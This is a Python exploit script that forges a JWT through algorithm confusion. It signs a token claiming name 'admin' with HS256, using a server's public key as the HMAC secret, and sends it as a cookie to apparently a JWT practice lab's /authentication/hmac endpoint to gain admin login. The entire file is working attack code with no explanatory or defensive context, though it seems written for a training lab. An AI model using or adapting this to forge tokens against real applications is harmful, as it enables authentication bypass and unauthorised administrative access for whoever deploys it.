#!/usr/bin/python3

import requests
import sys
import hmac
import hashlib
import base64

def jwt_handle():

    admin_header = '{"alg":"HS256"}'
    admin_header = base64.urlsafe_b64encode(admin_header.encode("utf-8"))
    admin_header = str(admin_header, "utf-8").rstrip("=")
    
    admin_payload = '{"name":"admin"}'
    admin_payload = base64.urlsafe_b64encode(admin_payload.encode("utf-8"))
    admin_payload = str(admin_payload, "utf-8").rstrip("=")
    
    # Make sure that the public key is the RIGHT FORMAT (There is another line at the end...)
    with open("pub.key") as f: 
        key = f.read()

    verify_key = base64.urlsafe_b64encode(
        hmac.new(
            bytes(key, "UTF-8"), 
            (admin_header + "." + admin_payload).encode("utf-8"), 
            hashlib.sha256
            ).digest()).decode('utf-8').rstrip("=")

    admin_jwt = f"{admin_header}.{admin_payload}.{verify_key}"
    return admin_jwt

def admin_login(new_admin_jwt_token, url, endpoint):

    cookies = {
        "challenge": new_admin_jwt_token,
    }

    r = requests.get(url + endpoint, cookies=cookies)
    if "admin" in r.text:
        print("[INFO] Successfully login as admin")
    else:
        print("[ERROR] Something went wrong!")
        sys.exit(1)


if __name__ == '__main__':
    url = "https://jwt-lab.herokuapp.com"
    endpoint = "/authentication/hmac"

    new_admin_jwt_token = jwt_handle()
    print(f"[INFO] New JWT Token (hmac): {new_admin_jwt_token}")

    admin_login(new_admin_jwt_token, url, endpoint)